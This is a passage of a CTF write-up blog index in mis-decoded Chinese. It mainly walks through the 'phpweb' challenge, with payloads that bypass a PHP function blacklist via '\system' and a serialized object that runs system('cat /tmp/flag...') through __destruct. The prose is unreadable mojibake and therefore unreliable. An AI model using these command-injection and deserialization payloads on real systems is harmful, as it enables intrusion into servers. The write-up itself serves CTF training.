class="hljs-attribute">KOI8</span>-U*<br>    <span class="hljs-attribute">ArmSCII</span>-<span class="hljs-number">8</span>ï¼ˆåˆ«åï¼šArmSCII8<br></code></pre></td></tr></table></figure><br>ç›´æ¥å»ç¿»äº†wpã€‚ã€‚æ„Ÿè°¢è¿™ä½å¸ˆå‚…ï¼š<br><code>https://blog.csdn.net/gsumall04/article/details/131807065?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169373375216800222871982%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169373375216800222871982&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-131807065-null-null.142^v93^koosearch_v1&amp;utm_term=%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&amp;spm=1018.2226.3001.4187</code><br>æˆ‘æ˜¯æ‡’ç‹—å°±ä¸ä¸€ä¸ªä¸€ä¸ªåŠ äº†ã€‚ã€‚ä¹Ÿä¸çŸ¥é“æœ‰æ²¡æœ‰ç¼–ç çš„å­—å…¸ï¼Œèƒ½æ–¹ä¾¿ä¸å°‘ã€‚æˆ‘æ”¾äº†4ç§ç†Ÿæ‚‰ä¸‹æ­¥éª¤ï¼šburpsuiteçš„intruderæ¨¡å—çˆ†ä¸€ä¸‹ï¼Œé€‰æ‹©é›†æŸç‚¸å¼¹æ¨¡å¼ï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903191411125-1673822326.png" alt="image"><br>æ ¹æ®é•¿åº¦æ’åˆ—ä¸€ä¸‹ï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903191442857-1708949819.png" alt="image"><br>æ‹¿åˆ°flagï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903191453864-1253755233.png" alt="image"><br>æœ€åè¯´ä¸‹ä¸ºä»€ä¹ˆè¦å»è¯»flag.phpè€Œä¸æ˜¯åˆ«çš„ï¼šä¸€æ˜¯å¾ˆå¤šflagéƒ½åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œï¼ŒäºŒæ˜¯ç›´æ¥è®¿é—®flag.phpæ—¶å®ƒå¹¶æ²¡ç»™æˆ‘ä»¬æŠ¥é”™:<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903192129048-1514343739.png" alt="image"><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903192145289-1200878021.png" alt="image"><br><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs tap"><br><br>1xxï¼ˆä¿¡æ¯æ€§çŠ¶æ€ç ï¼‰ï¼šè¡¨ç¤ºè¯·æ±‚å·²è¢«æ¥æ”¶ï¼Œç»§ç»­å¤„ç†ã€‚<br>   <span class="hljs-number"> 100 </span>Continueï¼šæœåŠ¡å™¨å·²æ¥æ”¶åˆ°è¯·æ±‚çš„åˆå§‹éƒ¨åˆ†ï¼Œå®¢æˆ·ç«¯åº”ç»§ç»­å‘é€å‰©ä½™éƒ¨åˆ†ã€‚<br>   <span class="hljs-number"> 101 </span>Switching Protocolsï¼šæœåŠ¡å™¨å·²ç†è§£å¹¶æ¥å—å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œå°†åˆ‡æ¢åˆ°æ–°çš„åè®®ã€‚<br><br>2xxï¼ˆæˆåŠŸçŠ¶æ€ç ï¼‰ï¼šè¡¨ç¤ºè¯·æ±‚å·²æˆåŠŸè¢«æœåŠ¡å™¨æ¥æ”¶ã€ç†è§£å’Œå¤„ç†ã€‚<br>   <span class="hljs-number"> 200 </span>OKï¼šè¯·æ±‚æˆåŠŸï¼ŒæœåŠ¡å™¨è¿”å›è¯·æ±‚çš„å†…å®¹ã€‚<br>   <span class="hljs-number"> 201 </span>Createdï¼šè¯·æ±‚æˆåŠŸï¼ŒæœåŠ¡å™¨åˆ›å»ºäº†æ–°èµ„æºã€‚<br>   <span class="hljs-number"> 204 </span>No Contentï¼šè¯·æ±‚æˆåŠŸï¼ŒæœåŠ¡å™¨å¤„ç†æˆåŠŸï¼Œä½†æ²¡æœ‰è¿”å›ä»»ä½•å†…å®¹ã€‚<br><br>3xxï¼ˆé‡å®šå‘çŠ¶æ€ç ï¼‰ï¼šè¡¨ç¤ºéœ€è¦è¿›ä¸€æ­¥æ“ä½œä»¥å®Œæˆè¯·æ±‚ã€‚<br>   <span class="hljs-number"> 301 </span>Moved Permanentlyï¼šè¯·æ±‚çš„èµ„æºå·²æ°¸ä¹…ç§»åŠ¨åˆ°æ–°ä½ç½®ã€‚<br>   <span class="hljs-number"> 302 </span>Foundï¼šè¯·æ±‚çš„èµ„æºä¸´æ—¶ç§»åŠ¨åˆ°æ–°ä½ç½®ã€‚<br>   <span class="hljs-number"> 304 </span>Not Modifiedï¼šèµ„æºæœªä¿®æ”¹ï¼Œå®¢æˆ·ç«¯å¯ä»¥ä½¿ç”¨ç¼“å­˜çš„ç‰ˆæœ¬ã€‚<br><br>4xxï¼ˆå®¢æˆ·ç«¯é”™è¯¯çŠ¶æ€ç ï¼‰ï¼šè¡¨ç¤ºå®¢æˆ·ç«¯å‘é€çš„è¯·æ±‚æœ‰é”™è¯¯ã€‚<br>   <span class="hljs-number"> 400 </span>Bad Requestï¼šè¯·æ±‚æ— æ•ˆï¼ŒæœåŠ¡å™¨æ— æ³•ç†è§£ã€‚<br>   <span class="hljs-number"> 401 </span>Unauthorizedï¼šè¯·æ±‚è¦æ±‚èº«ä»½éªŒè¯ã€‚<br>   <span class="hljs-number"> 404 </span>Not Foundï¼šè¯·æ±‚çš„èµ„æºä¸å­˜åœ¨ã€‚<br><br>5xxï¼ˆæœåŠ¡å™¨é”™è¯¯çŠ¶æ€ç ï¼‰ï¼šè¡¨ç¤ºæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚æ—¶å‘ç”Ÿé”™è¯¯ã€‚<br>   <span class="hljs-number"> 500 </span>Internal Server Errorï¼šæœåŠ¡å™¨é‡åˆ°äº†æ„å¤–é”™è¯¯ã€‚<br>   <span class="hljs-number"> 502 </span>Bad Gatewayï¼šæœåŠ¡å™¨ä½œä¸ºç½‘å…³æˆ–ä»£ç†ï¼Œä»ä¸Šæ¸¸æœåŠ¡å™¨æ¥æ”¶åˆ°æ— æ•ˆå“åº”ã€‚<br>   <span class="hljs-number"> 503 </span>Service Unavailableï¼šæœåŠ¡å™¨å½“å‰æ— æ³•å¤„ç†è¯·æ±‚ï¼Œé€šå¸¸ç”±äºè¿‡è½½æˆ–ç»´æŠ¤ã€‚<br></code></pre></td></tr></table></figure><br><strong>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</strong></h2><p>è¿›å…¥ç¯å¢ƒï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093450823-256892203.png" alt="image"><br>æ²¡å•¥ç‰¹åˆ«çš„ã€‚ã€‚ä¸è¿‡è¿™é¡µé¢æ²¡è¿‡å‡ ç§’å°±ä¼šåˆ·æ–°ä¸€ä¸‹ï¼Œå‡ºç°ä¸‹é¢è¿™ç§ä¸œè¥¿ï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093541288-1989671347.png" alt="image"><br>ä»–è¯´æŸä¸ªå’Œdataæœ‰å…³çš„å‡½æ•°è®¾ç½®æœ‰é—®é¢˜?å³é”®çœ‹ä¸‹æºç æœ‰å•¥ä¸œè¥¿ï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093749742-1998449790.png" alt="image"><br>burpsuiteæŠ“ä¸‹åŒ…çœ‹çœ‹ï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093907037-1988636454.png" alt="image"><br>ä¸‹é¢æœ‰ä¸ªè¿™ä¸ªä¸œè¥¿ï¼š<br><code>func=date&amp;p=Y-m-d+h%3Ai%3As+a</code><br>å‰é¢æ˜¯ä¸ªå‡½æ•°ï¼Ÿåé¢æ˜¯ä»–çš„å‚æ•°ï¼Ÿçœ‹ç€åƒå‘½ä»¤æ‰§è¡Œï¼Œæ”¹æˆsystem(â€˜lsâ€™)çœ‹çœ‹æ•ˆæœï¼š<br><code>func=system&amp;p=ls</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904094304564-1249635122.png" alt="image"><br>å›æ˜¾äº†hackerã€‚ã€‚ä¼°è®¡æ˜¯å¤ªç›´ç™½äº†ï¼Œsystem&#x2F;evaléƒ½ä¼šå›æ˜¾Hackerã€‚include&#x2F;requireå‡½æ•°è¯»ä¸‹index.phpçš„æºç ï¼Ÿ<br><code>func=include&amp;p=php://filter/read=convert.base64-encode/resource=index.php</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904100428721-1887388885.png" alt="image"><br>æç¤ºcall_user_func()å‡½æ•°æ‰¾ä¸åˆ°ç¬¬ä¸€ä¸ªå‚æ•°include&#x2F;requireæˆ–è¿™æ˜¯ä¸€ä¸ªæ— æ•ˆçš„å‡½æ•°åï¼Ÿæ€ä¹ˆä¼šæ‰¾ä¸åˆ°include()å‡½æ•°å‘¢ï¼Ÿé—®äº†ä¸‹GPTå‘ç°call_back_funcä¸æ˜¯æ‰€æœ‰å‡½æ•°éƒ½èƒ½æ‰§è¡Œï¼Œå®ƒæ˜¯<strong>è°ƒç”¨ä¸€ä¸ªå›è°ƒå‡½æ•°æˆ–æ–¹æ³•</strong>ã€‚è€Œä¸”å¹¶ä¸æ˜¯æ‰€æœ‰å‡½æ•°éƒ½æ˜¯å›è°ƒå‡½æ•°ï¼Œåˆ¤æ–­ä¸€ä¸ªå‡½æ•°èƒ½å¦å›è°ƒå¯ä»¥ç”¨<code>is_callable</code>å‡½æ•°ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-variable">$callback</span> = <span class="hljs-string">&#x27;include&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_callable</span>(<span class="hljs-variable">$callback</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;å¯ä»¥å›è°ƒ&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;ä¸å¯å›è°ƒ&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//ç»“æœï¼šä¸å¯å›è°ƒ</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸å¾—ä¸è¯´CHATGPTè¿™ä¸œè¥¿ç¡®å®å¥½ç”¨ï¼Œæˆ‘é—®ä»–call_back_func(include,php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php)ä¸ºä»€ä¹ˆä¸è¡Œæ—¶ä»–ä¸å…‰ç»™äº†ä¸å¯ç”¨çš„ç†ç”±ï¼Œè¿˜å»ºè®®æˆ‘ç”¨file_get_contents()å‡½æ•°å»è¯»æ–‡ä»¶ï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904102026887-1995512140.png" alt="image"><br>å·®ç‚¹æŠŠè¿™ä¸œè¥¿å¿˜äº†ï¼Œæ—¢ç„¶å®ƒå¯ä»¥å›è°ƒå°±file_get_contents(index.php)è¯»ä¸‹Index.phpï¼š<br><code>func=file_get_contents&amp;p=index.php</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904102245157-1804309849.png" alt="image"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   <span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span>);<span class="hljs-comment">//é»‘åå•ï¼Œç¦ç”¨äº†å¾ˆå¤šå‡½æ•°</span><br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span></span>) </span>&#123;<br>       <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>); <span class="hljs-comment">//è°ƒç”¨call_user_funcå‡½æ•°ï¼Œæ³¨æ„è¯¥å‡½æ•°åªèƒ½è°ƒç”¨å¯ä»¥å›è°ƒçš„å‡½æ•°</span><br>       <span class="hljs-variable">$a</span>= <span class="hljs-title function_ invoke__">gettype</span>(<span class="hljs-variable">$result</span>); <span class="hljs-comment">//$resultæ˜¯ä»€ä¹ˆç±»å‹ï¼Ÿ</span><br>       <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-string">&quot;string&quot;</span>) &#123; <span class="hljs-comment">//å¦‚æœæ˜¯å­—ç¬¦ä¸²</span><br>           <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>       &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;&#125; <span class="hljs-comment">//å¦‚æœæ˜¯å…¶å®ƒ</span><br>   &#125;<br>   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>       <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<span class="hljs-comment">//æ—§å¼çš„ç”¨äºå£°æ˜ç±»å±æ€§ï¼ˆæˆå‘˜å˜é‡ï¼‰çš„å…³é”®å­—ï¼Œæ–°ç‰ˆæœ¬çš„PHPå¤šç”¨ publicç­‰</span><br>       <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>       <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>           <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>               <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p);<br>           &#125;<br>       &#125;<br>   &#125;<br>   <span class="hljs-variable">$func</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;func&quot;</span>];<span class="hljs-comment">//è·å–é€šè¿‡ GETã€POST å’Œ COOKIE æ–¹æ³•ä¼ é€’çš„å‚æ•°</span><br>   <span class="hljs-variable">$p</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;p&quot;</span>];<br><br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> != <span class="hljs-literal">null</span>) &#123;<br>       <span class="hljs-variable">$func</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$func</span>);<br>       <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$disable_fun</span>)) &#123;<br>           <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>       &#125;<span class="hljs-keyword">else</span> &#123;<br>           <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);<br>       &#125;<br>   &#125;<br>   <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å°è¯•ç”¨ç›¸å¯¹è·¯å¾„è¯»æœ‰æ²¡æœ‰flag.phpè¿™ä¸œè¥¿ã€‚ã€‚æ²¡è¯•å‡ºæ¥ã€‚ã€‚å°±å»ç½‘ä¸Šæ‰¾äº†ä¸‹wpã€‚æ„Ÿè§‰å·²ç»å¾ˆæ¥è¿‘ç»“æœäº†æœ‰ç‚¹ä¸ç”˜å¿ƒğŸ˜”æ„Ÿè°¢è¿™ä½å¸ˆå‚…çš„æ–‡ç« ï¼š<br><code>https://blog.csdn.net/qq_58784379/article/details/120877859</code><br>ç¬¬ä¸€ç§æ–¹æ³•ï¼š<br>åœ¨PHPä¸­çš„å‡½æ•°å‰é¢åŠ ä¸ª\å¹¶ä¸å°è±¡å‡½æ•°è¿è¡Œ(phpå†…çš„â€ \ â€œåœ¨åšä»£ç æ‰§è¡Œçš„æ—¶å€™ï¼Œä¼šè¯†åˆ«ç‰¹æ®Šå­—ç¬¦ä¸²ï¼Œç»•è¿‡é»‘åå•)ã€‚æ‹¿å‰é¢é‚£ä¸ªis_callableå‡½æ•°ä¸¾ä¸ªä¾‹å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-variable">$callback</span> = <span class="hljs-string">&#x27;include&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (\<span class="hljs-title function_ invoke__">is_callable</span>(<span class="hljs-variable">$callback</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;å¯ä»¥å›è°ƒ&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;ä¸å¯å›è°ƒ&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//ç»“æœä»æ˜¯ä¸å¯å›è°ƒ</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>é—®äº†ä¸‹GPTï¼Œè¿™ä¸ª\æ˜¯ä¸€ç§å‘½åç©ºé—´é™å®šç¬¦ï¼Œç”¨äºå‘Šè¯‰ PHP è§£é‡Šå™¨è¦ä½¿ç”¨å…¨å±€å‘½åç©ºé—´ä¸­çš„å‡½æ•°ï¼Œè€Œä¸æ˜¯å½“å‰å‘½åç©ºé—´ä¸­çš„å‡½æ•°ã€‚å¦‚æœæ²¡æœ‰ä½¿ç”¨å‘½åç©ºé—´æˆ–æ²¡æœ‰åŒåå‡½æ•°å­˜åœ¨äºå…¨å±€å‘½åç©ºé—´ä¸­ï¼Œæ·»åŠ åæ–œæ å°†æ²¡æœ‰å®é™…å½±å“ã€‚<br><code>func=\system&amp;p=find / -name &quot;flag*&quot;//è·Ÿä»¥å‰åšçš„é¢˜ä¸€æ ·ï¼Œåªè¦ç”¨findæ‰¾ä¸œè¥¿å°±æ˜¯å…¨ç£ç›˜æŸ¥æ‰¾ï¼Œä¼šå¾ˆæ…¢</code><br>å›æ˜¾ï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904110040442-185642157.png" alt="image"><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904110103088-327207158.png" alt="image"><br>è¯»æœ€åº•ä¸‹è¿™ä¸ª<code>/tmp/flagoefiu4r93</code>ï¼š<br><code>func=file_get_contents&amp;p=/tmp/flagoefiu4r93</code><br>æˆ–è€…<code>func=\system&amp;p=cat /tmp/flagoefiu4r93</code><br>å¾—flag<br>ç¬¬äºŒç§æ–¹æ³•ç”¨äº†ååºåˆ—åŒ–ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p); <span class="hljs-comment">//å‘½ä»¤æ‰§è¡Œ</span><br>            &#125;<br>        &#125;<br><span class="hljs-comment">//è¿™ä¸œè¥¿æ²¡è¢«ç”¨è¿‡ï¼Œå› ä¸ºTestç±»é‡ŒåŒ…å«ä¸€ä¸ª__destructå‡½æ•°ï¼Œè¿™å‡½æ•°åœ¨å¯¹è±¡è¢«é”€æ¯æ—¶ä¼šè¢«è°ƒç”¨ï¼Œ</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æƒ³æ‰§è¡Œsystem(â€˜lsâ€™)è€Œä¸”è¦ç»•è¿‡å¯¹funcçš„é»‘åå•æ£€æµ‹ï¼Œå¯ä»¥å…ˆåºåˆ—åŒ–è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œç„¶ååˆ©ç”¨getå‡½æ•°ååºåˆ—åŒ–è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œååºåˆ—åŒ–åè¦é”€æ¯å˜é‡æ—¶ä¼šè°ƒç”¨__destructå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å®šä¹‰äº†func(è¦æ‰§è¡Œçš„å‘½ä»¤)å’Œp(è¦æ‰§è¡Œå‘½ä»¤çš„å‚æ•°)ï¼Œç„¶åå†è°ƒç”¨ä¸€æ¬¡gettimeå‡½æ•°(åˆæ‰§è¡Œäº†ä¸€æ¬¡å‘½ä»¤)ã€‚ä¸€æ¥ä¸€å›æ‰§è¡Œäº†ä¸¤æ¬¡gettimeã€‚<br>å…ˆåºåˆ—åŒ–æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤å’Œå‚æ•°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>       <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;ls&quot;</span>;<br>       <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;system&quot;</span>;<br>       <br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//ç»“æœï¼šO:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>payload:<br><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;// çœ‹å½“å‰ç›®å½•ä¸‹æœ‰ä»€ä¹ˆæ–‡ä»¶</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904121505457-2065669123.png" alt="image"><br>OKï¼Œæ²¡å•¥é—®é¢˜ï¼Œå› ä¸ºæ ¹æ®ç¬¬ä¸€ç§åšæ³•å·²ç»çŸ¥é“äº†flagè—åœ¨å“ªï¼Œç›´æ¥å»æ‰¾<code>/tmp/flagoefiu4r93</code>æŠŠæˆ‘ä»¬çš„å‘½ä»¤åºåˆ—åŒ–ä¸€ä¸‹ï¼š<br><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code><br>ç»“æœï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904121727159-1447658532.png" alt="image"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
